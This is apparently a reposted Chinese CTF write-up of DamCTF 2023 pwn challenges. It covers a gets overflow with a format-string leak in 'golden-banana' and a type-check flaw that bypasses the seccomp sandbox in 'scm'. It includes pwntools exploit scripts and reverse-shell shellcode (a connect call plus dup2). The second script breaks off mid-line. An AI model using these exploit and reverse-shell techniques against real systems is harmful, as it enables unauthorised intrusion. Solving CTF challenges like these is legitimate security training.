---
title: [原创]DamCTF and Midnight Sun CTF Qualifiers pwn部分wp
url: https://buaq.net/go-157942.html
source: unSafe.sh - 不安全
date: 2023-04-11
fetch_date: 2025-10-04T11:29:37.654952
---

# [原创]DamCTF and Midnight Sun CTF Qualifiers pwn部分wp

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/84c3734caad9c0f7ea9b4516731b4a81.jpg)

[原创]DamCTF and Midnight Sun CTF Qualifiers pwn部分wp

就看了几道pwn题，但佬们速度太快全秒了，赛后复现一波DamCTF 2023 Qualsgolden-bananaBy BobbySinclusto
*2023-4-10 20:1:17
Author: [bbs.pediy.com(查看原文)](/jump-157942.htm)
阅读量:22
收藏*

---

就看了几道pwn题，但佬们速度太快全秒了，赛后复现一波

## DamCTF 2023 Quals

### golden-banana

> By BobbySinclusto
>
> The Quest for the Golden Banana is a text-based adventure game that combines humor, action, and mystery in an epic story that will keep you hooked until the end. Explore exotic locations, interact with colorful characters, and make choices that will shape your destiny. Do you have what it takes to complete The Quest for the Golden Banana?
>
> The story for this challenge was entirely written by the Bing AI chatbot :-)

是一个小游戏程序，开始时会读取房间信息，所有的信息保存在main函数中的game结构体局部变量里，每个房间的选项结构体中保存选择该选项后要到达的房间的地址。

房间信息文件里有一个SECRET ROOM，会直接输出flag。

在输入选项的地方用gets，存在溢出漏洞

|  |  |
| --- | --- |
| 1  2  3  4 | `/``/` `Get choice` `from` `user`  `gets(g.input_buf);`  `/``/` `Allow either specifying the number` `or` `typing the description`  `choice` `=` `atoi(g.input_buf)` `-` `1``;` |

输出描述信息时用printf直接打印每个房间的描述信息

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9 | `void print_location(location` `*``l) {`  `printf(l``-``>description);`  `if` `(l``-``>end_location) {`  `exit(``0``);`  `}`  `for` `(``int` `i` `=` `0``; i < l``-``>num_choices;` `+``+``i) {`  `printf(``"%d: %s"``, i` `+` `1``, l``-``>choices[i].description);`  `}`  `}` |

思路是利用gets溢出覆盖到某一个房间的描述信息，通过格式化字符串泄漏出栈地址，再通过gets溢出覆盖选项结构体中目标房间的指针，跳转到SECRET ROOM。

很久没有打CTF了以至于已经忘了**gets是\x0a截断而不是\x00截断**，卡了好久

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71 | `from` `pwn` `import` `*`  `import` `sys`  `import` `time`  `context.log_level` `=` `'debug'`  `context.arch``=``'amd64'`  `def` `exp(ip, port):`  `local``=``1`  `binary_name``=``'golden_banana'`  `libc_name``=``'libc.so.6'`  `libc``=``ELF(``"./"``+``libc_name)`  `e``=``ELF(``"./"``+``binary_name)`  `if` `local:`  `p``=``process(``"./"``+``binary_name)`  `else``:`  `p``=``remote(ip,port)`  `def` `z(a``=``''):`  `if` `local:`  `gdb.attach(p,a)`  `if` `a``=``=``'':`  `raw_input`  `else``:`  `pass`  `ru``=``lambda` `x:p.recvuntil(x)`  `sl``=``lambda` `x:p.sendline(x)`  `sd``=``lambda` `x:p.send(x)`  `sa``=``lambda` `a,b:p.sendafter(a,b)`  `sla``=``lambda` `a,b:p.sendlineafter(a,b)`  `ia``=``lambda` `:p.interactive()`  `def` `cat():`  `ru(``'> '``)`  `sl(``'cat'``)`  `def` `echo(x):`  `ru(``'> '``)`  `sl(b``'echo '``+``x)`  `def` `exit():`  `ru(``'> '``)`  `sl(``'exit'``)`  `z(``'b*$rebase(0x17fa)'``)`  `time.sleep(``1``)`  `ru(``'2: Go south'``)`  `sl(``'1\x00'``)`  `ru(``'2: No, go back'``)`  `sl(``'2\x00'``+``'1'``*``(``0x1828``-``2``)``+``'%3$lx'``)`  `ru(``'2: Go south'``)`  `sl(``'1\x00'``)`  `stack` `=` `int``(ru(``':'``)[:``-``2``],``16``)`  `ru(``'2: No, go back'``)`  `sl(b``'1\x00'``+``b``'1'``*``(``0x2028``-``2``)``+``p64(stack``+``0x1428``*``11``))`  `p.interactive()`  `return` `''`  `if` `__name__` `=``=` `"__main__"``:`  `flag` `=` `exp(``0``,` `0``)` |

## scm

> By captainGeech
>
> Keeping track of your different shellcode payloads is annoying, but the SCM is here to help! Safety first, though!

题目文件是一个shellcode管理器，3种不同的shellcode，分别用seccomp-tools查沙箱

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42 |  |

在执行shellcode的时候会fork开启另一个进程来执行，由于进程是资源分配的基本单位，所以fork出的子进程的内存页面与父进程一致，可以用type3的shellcode进行write系统调用泄露地址，但是由于内存页不同，type2的shellcode往子进程的内存中写数据就没什么用。

edit shellcode的函数中，用`(unsigned __int8)`类型来判断type是否在1～3之间，在写入时又用`*(_DWORD *)(a1 + 4) = v2;`写入4字节，可以输入0x101~0x103绕过检查并使得type不合法

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12 | `unsigned` `int` `v2;`  `... ...`  `fgets((char` `*``)&v6,` `49``, stdin);`  `v2` `=` `strtol((const char` `*``)&v6,` `0LL``,` `10``);`  `if` `( (unsigned __int8)(v2` `-` `1``) >` `2u` `)` `/``/``bug`  `{`  `puts(``"Bad type!"``);`  `return` `0``;`  `}`  `printf(``"Changing type to %d\n"``, v2);`  `*``(_DWORD` `*``)(a1` `+` `4``)` `=` `v2;`  `... ...` |

在执行shellcode的函数中，会根据type类型为进程加沙箱规则，禁用系统调用，但是检查时若type大于3，则会直接跳过添加沙箱规则的函数`sub_1279`直接执行

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32 | `if` `( !fork() )`  `{`  `close(``2``);` `/``/``stderr`  `if` `(` `*``((_DWORD` `*``)a1` `+` `1``)` `=``=` `3` `|| (close(``1``),` `*``((_DWORD` `*``)a1` `+` `1``) !``=` `2``) )` `/``/``stdout`  `{`  `close(``0``);` `/``/``stdin`  `v2` `=` `*``((_DWORD` `*``)a1` `+` `1``);`  `if` `( v2` `=``=` `3` `)`  `{`  `if` `( !(unsigned __int8)sub_1279(``0LL``,` `1LL``) )`  `goto LABEL_13;`  `goto LABEL_12;`  `}`  `if` `( v2 >` `3` `)` `/``/``bug`  `goto LABEL_12;`  `if` `( v2` `=``=` `1` `)`  `{`  `if` `( !(unsigned __int8)sub_1279(``0LL``,` `0LL``) )`  `goto LABEL_13;`  `goto LABEL_12;`  `}`  `if` `( v2 !``=` `2` `)`  `goto LABEL_12;`  `}`  `if` `( !(unsigned __int8)sub_1279(``1LL``,` `0LL``) )`  `LABEL_13:`  `exit(``0``);`  `LABEL_12:`  `((void (``*``)(void))v1)();`  `goto LABEL_13;`  `}`  `wait((__WAIT_STATUS)stat_loc);` |

所以思路就是edit时破坏type，执行时绕过添加沙箱规则的函数直接执行shellcode，但是程序在fork出的子进程中关闭了三个基本的文件描述符，在执行的shellcode中直接调用`execve("/bin/sh",0,0)`是不行的，需要反弹shell，并且shellcode的长度需要小于0x64。

过程就是先在本地监听端口，再用shellcode完成socket, connect操作

|  |  |
| --- | --- |
| 1 | `code` `=` `asm(pwnlib.shellcraft.amd64.linux.connect(ip,port))` |

由于此时文件描述符0,1,2都被关闭了，此时的socket返回的fd是0，所以再完成一次dup2操作，复制一个socket的fd为1

|  |  |
| --- | --- |
| 1 | `code` `+``=` `asm(pwnlib.shellcraft.amd64.linux.dup2(``0``,``1``))` |

之后再执行/bin/sh时会按照正常情况将0作为标准输入，1作为标准输出来执行命令，但是此时的文件描述符0和1其实都已经是socket的fd，就在监听端获得了一个shell。

使用多线程编程来在一个窗口get shell，启一个线程与题目交互，主线程监听端口等待反弹shell。由于pwntools生成的执行sh的shellcode太长，可以自己手写一段。

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99  100  101  102 | `from` `pwn` `import` `*`  `import` `sys`  `import` `time`  `import` `threading`  `context.log_level` `=` `'debug'`  `context.arch``=``'amd64'`  `code` `=` `asm(pwnlib.shellcraft.amd64.linux.connect(``'0.0.0.0'``,``8888``))`  `code` `+``=` `asm(pwnlib.shellcraft.amd64.linux.dup2(``0``,``1``))`  `shell``=`  `code` `+``=` `asm(shell)`  `def` `exp(ip, port):`  `local``=``1`  `binary_name``=``'scm'`  `libc_name``=``'libc.so.6'`  `libc``=``ELF(``"./"``+``libc_name)`  `e``=``ELF(``"./"``+``binary_name)`  `if` `local:`  `p``=``process(``"./"``+``binary_name)`  `else``:`  `p``=``remote(ip,port)`  `def` `z(a``=``''):`  `if` `local:`  `gdb.attach(p,a)`  `if` `a``=``=``'':`  `raw_input`  `else``:`  `pass`  `ru``=``lambda` `x:p.recvuntil(x)`  `sl``=``lambda` `x:p.sendline(x)`  `sd``=``lambda` `x:p.send(x)`  `sa``=``lambda` `a,b:p.sendafter(a,b)`  `sla``=``lambda` `a,b:p.sendlineafter(a,b)`  `ia``=``lambda` `:p.interactive()`  `def` `cho(choice):`  `ru(``'Choice: '``)`  `sl(``str``(choice))`  `def` `add(t, s, val):`  `cho(``1``)`  `ru(``'write):'``)`  `sl(``str``(t))`  `ru(``'shellcode: '``)`  `sl(``s...